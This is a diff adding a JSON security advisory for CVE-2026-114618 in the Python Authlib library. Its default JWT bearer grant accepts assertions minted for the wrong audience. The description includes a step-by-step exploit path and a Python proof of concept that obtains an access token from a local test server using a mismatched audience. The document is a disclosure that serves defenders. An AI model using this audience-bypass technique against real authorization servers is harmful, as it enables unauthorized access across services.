@@ -1,0 +1,127 @@
+{
+  "id": "GHSA-fch4-3c6x-j4gc",
+  "modified": "2026-10-27T15:47:24.261521647Z",
+  "published": "2026-10-27T15:39:08Z",
+  "aliases": [
+    "CVE-2026-114618"
+  ],
+  "summary": "Authlib: Default JWT bearer grant accepts assertions for the wrong audience",
+  "details": "## Description\n\n### Summary\n\nAuthlib's default RFC 7523 JWT bearer grant leaves `get_audiences()` empty, so `verify_claims()` only checks that an `aud` claim *exists* instead of requiring it to match the current authorization server's token endpoint. An attacker holding a legitimately issued JWT assertion for *any* audience can present it to a different authorization server sharing the same signing key and obtain an access token.\n\nTo be completely transparent, AI tools helped surface it. However, we have independently reproduced and carefully validated the issue. We follow responsible disclosure practices and are sharing this privately.\n\n### Affected Entrypoints\n\n- `authlib.oauth2.rfc7523.JWTBearerGrant` — default `get_audiences()` returns empty list\n- `authlib.jose.jwt.decode()` with `claims_options` for audience validation\n- `authlib.integrations.flask_oauth2.ResourceProtector.validate_request()` when audience checking is enabled\n\n### Exploit Path\n\n```\n1. Attacker authenticates to Service A (low-privilege)\n2. Authorization server issues JWT with \"aud\": \"https://evil.test/token\"\n3. Attacker presents this assertion to Service B's token endpoint\n4. Service B uses default JWTBearerGrant (get_audiences() = [])\n5. verify_claims() only checks aud *exists*, not its value\n6. Service B issues an access token — audience bypass achieved\n```\n\n### Proof of Concept\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nDemonstrates that the default JWTBearerGrant accepts JWT assertions\nwhose audience does not match the token endpoint, while a strict\naudience override correctly rejects them.\n\"\"\"\nimport json\nimport os\nimport sys\n\nfrom joserfc.jwk import KeySet, OctKey\n\nWRONG_AUDIENCE = \"https://evil.test/token\"\nEXPECTED_AUDIENCE = \"https://provider.test/token\"\nGRANT_TYPE = \"urn:ietf:params:oauth:grant-type:jwt-bearer\"\n\n\ndef build_and_exercise(strict_audience: bool) -\u003e tuple[int, dict]:\n    from authlib.oauth2.rfc7523 import JWTBearerGrant as BaseJWTBearerGrant\n    # Uses Authlib's own Flask test fixtures\n    from tests.flask.test_oauth2.models import Client, User, db\n    from tests.flask.test_oauth2.oauth2_server import (\n        create_authorization_server, create_flask_app,\n    )\n\n    class JWTBearerGrant(BaseJWTBearerGrant):\n        def resolve_issuer_client(self, issuer):\n            return Client.query.filter_by(client_id=issuer).first()\n\n        def resolve_client_public_key(self, client):\n            return KeySet([\n                OctKey.import_key(\"foo\", {\"kid\": \"1\"}),\n                OctKey.import_key(\"bar\", {\"kid\": \"2\"}),\n            ])\n\n        def authenticate_user(self, subject):\n            return None\n\n        def has_granted_permission(self, client, user):\n            return True\n\n        # Only override get_audiences when testing strict mode\n        if strict_audience:\n            def get_audiences(self):\n                return [EXPECTED_AUDIENCE]\n\n    app = create_flask_app()\n    os.environ[\"AUTHLIB_INSECURE_TRANSPORT\"] = \"true\"\n\n    with app.app_context():\n        db.init_app(app)\n        db.create_all()\n\n        user = User(username=\"demo-user\")\n        db.session.add(user)\n        db.session.commit()\n\n        client = Client(\n            user_id=user.id,\n            client_id=\"client-id\",\n            client_secret=\"client-secret\",\n        )\n        client.set_client_metadata({\n            \"scope\": \"profile\",\n            \"redirect_uris\": [\"https://client.test/authorized\"],\n            \"grant_types\": [GRANT_TYPE],\n        })\n        db.session.add(client)\n        db.session.commit()\n\n        server = create_authorization_server(app)\n        server.register_grant(JWTBearerGrant)\n\n        # Sign assertion with WRONG audience\n        assertion = JWTBearerGrant.sign(\n            \"foo\",\n            issuer=\"client-id\",\n            audience=WRONG_AUDIENCE,  # \u003c-- Not the expected audience\n            subject=None,\n            header={\"alg\": \"HS256\", \"kid\": \"1\"},\n        )\n\n        rv = app.test_client().post(\n            \"/oauth/token\",\n            data={\"grant_type\": GRANT_TYPE, \"assertion\": assertion},\n        )\n        body = json.loads(rv.data)\n        db.session.remove()\n        db.drop_all()\n        return rv.status_code, body\n\n\ndef main() -\u003e int:\n    # Test 1: Default grant (no audience enforcement)\n    vuln_status, vuln_body = build_and_exercise(strict_audience=False)\n\n    # Test 2: Strict audience grant (correct behavior)\n    strict_status, strict_body = build_and_exercise(strict_audience=True)\n\n    result = {\n        \"wrong_audience\": WRONG_AUDIENCE,\n        \"expected_audience\": EXPECTED_AUDIENCE,\n        \"vulnerable_status\": vuln_status,\n        \"vulnerable_body\": vuln_body,\n        \"strict_status\": strict_status,\n        \"strict_body\": strict_body,\n    }\n    print(json.dumps(result, indent=2, sort_keys=True))\n\n    if (\n        vuln_status == 200\n        and \"access_token\" in vuln_body\n        and strict_body.get(\"error\") == \"invalid_grant\"\n    ):\n        print(\n            \"POC_SUCCESS: default JWTBearerGrant issued an access token for \"\n            \"an assertion whose aud did not match the token endpoint, while \"\n            \"strict audience validation rejected the same assertion.\"\n        )\n        return 0\n\n    print(\"POC_FAILURE: expected token issuance under default grant \"\n          \"and invalid_grant under strict audience control.\")\n    return 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n```\n\n### Observed Result\n\n- **Default grant (vulnerable):** HTTP 200, `access_token` issued despite `aud: \"https://evil.test/token\"`\n- **Strict grant (fixed):** HTTP 400, `error: \"invalid_grant\"` — correctly rejects mismatched audience\n- Confirms the default `get_audiences()` returns empty, so audience validation is effectively skipped\n\n### Impact\n\n- **Vulnerability Type:** CWE-287 — Improper Authentication\n- An attacker with a valid JWT assertion for *any* service can use it to obtain tokens from a *different* service sharing the same signing keys\n- Particularly dangerous in **microservice architectures** where services share identity infrastructure\n- Enables unauthorized access escalation across trust boundaries\n- The vulnerability is in the *default behavior* — most integrations won't override `get_audiences()`\n---\n### Credit\nReported by a security research team from the University of Sydney, focusing on detecting open source software vulnerabilities.\nLiyi Zhou: https://lzhou1110.github.io/\nZiyue Wang: https://zyy0530.github.io/\nStrick: https://str1ckl4nd.github.io/\nMaurice: https://maurice.busystar.org/\nChenchen Yu: https://7thparkk.github.io/",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "authlib",
+        "purl": "pkg:pypi/authlib"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.9.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1",
+        "0.10",
+        "0.11",
+        "0.12",
+        "0.12.1",
+        "0.13",
+        "0.14",
+        "0.14.1",
+        "0.14.2",
+        "0.14.3",
+        "0.15",
+        "0.15.1",
+        "0.15.2",
+        "0.15.3",
+        "0.15.4",
+        "0.15.5",
+        "0.15.6",
+        "0.1rc0",
+        "0.2",
+        "0.2.1",
+        "0.3",
+        "0.4",
+        "0.4.1",
+        "0.5",
+        "0.5.1",
+        "0.6",
+        "0.7",
+        "0.8",
+        "0.9",
+        "1.0.0",
+        "1.0.0a1",
+        "1.0.0a2",
+        "1.0.0b1",
+        "1.0.0b2",
+        "1.0.0rc1",
+        "1.0.1",
+        "1.1.0",
+        "1.2.0",
+        "1.2.1",
+        "1.3.0",
+        "1.3.1",
+        "1.3.2",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.5.1",
+        "1.5.2",
+        "1.6.0",
+        "1.6.1",
+        "1.6.10",
+        "1.6.11",
+        "1.6.12",
+        "1.6.2",
+        "1.6.3",
+        "1.6.4",
+        "1.6.5",
+        "1.6.6",
+        "1.6.7",
+        "1.6.8",
+        "1.6.9",
+        "1.7.0",
+        "1.7.1",
+        "1.7.2",
+        "1.8.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-fch4-3c6x-j4gc/GHSA-fch4-3c6x-j4gc.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/authlib/security/advisories/GHSA-fch4-3c6x-j4gc"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-114618"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/authlib/pull/945"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/authlib/commit/e3bd41cb29dcfee434453b135ffb487884baeedf"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/authlib/authlib"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/authlib/releases/tag/v1.9.0"
+    }
+  ]
+}
